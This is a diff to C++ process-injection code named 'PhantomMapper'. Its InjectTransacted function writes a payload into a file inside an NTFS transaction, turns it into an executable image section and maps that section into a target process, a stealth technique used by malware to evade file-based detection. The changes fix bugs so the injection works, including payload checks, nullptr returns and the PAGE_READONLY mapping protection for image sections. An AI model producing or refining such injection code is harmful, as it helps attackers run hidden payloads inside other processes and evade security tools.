@@ -61,12 +61,17 @@ PVOID InjectTransacted(HANDLE hProcess, const void* pPayload, size_t payloadSize
     }
 
     // 3. Overwrite the file inside the transaction boundaries with our payload
-    DWORD bytesWritten = 0;
-    if (!WriteFile(hTransactedFile, pPayload, (DWORD)payloadSize, &bytesWritten, nullptr)) {
-        LOG(L"PhantomMapper: WriteFile failed: %u", GetLastError());
-        CloseHandle(hTransactedFile);
-        CloseHandle(hTransaction);
-        return false;
+    if (pPayload && payloadSize > 0) {
+        DWORD bytesWritten = 0;
+        if (!WriteFile(hTransactedFile, pPayload, (DWORD)payloadSize, &bytesWritten, nullptr)) {
+            LOG(L"PhantomMapper: WriteFile failed: %u", GetLastError());
+            CloseHandle(hTransactedFile);
+            CloseHandle(hTransaction);
+            return nullptr;
+        }
+    } else {
+        // Fallback or error
+        LOG(L"PhantomMapper: No payload provided for transaction.");
     }
 
     // 4. Create an executable image section from the transacted file
@@ -91,15 +96,17 @@ PVOID InjectTransacted(HANDLE hProcess, const void* pPayload, size_t payloadSize
     // 6. Map the section into the target process
     PVOID pRemoteBase = nullptr;
     SIZE_T viewSize = 0;
+    // SEC_IMAGE mappings should generally use PAGE_READONLY as the initial protection; 
+    // the actual section protections (RX, R, etc) are derived from the PE headers.
     status = NtMapViewOfSection(
         hSection, hProcess, &pRemoteBase, 0, 0, nullptr, 
-        &viewSize, (SECTION_INHERIT)2 /* ViewUnmap */, 0, PAGE_READWRITE
+        &viewSize, (SECTION_INHERIT)2 /* ViewUnmap */, 0, PAGE_READONLY
     );
 
     if (!NT_SUCCESS(status)) {
         LOG(L"PhantomMapper: NtMapViewOfSection failed: 0x%08X", status);
         CloseHandle(hSection);
-        return false;
+        return nullptr;
     }
 
     // Mark as execute
